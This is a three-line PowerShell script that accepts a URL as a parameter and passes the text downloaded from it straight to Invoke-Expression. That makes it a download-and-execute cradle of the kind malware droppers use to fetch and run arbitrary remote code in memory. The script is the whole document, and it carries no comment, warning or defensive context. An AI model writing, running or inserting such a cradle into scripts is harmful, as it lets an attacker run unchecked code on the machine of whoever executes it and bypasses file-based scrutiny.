param(
[string]$url
)
iex ((New-Object System.Net.WebClient).DownloadString("$url"))
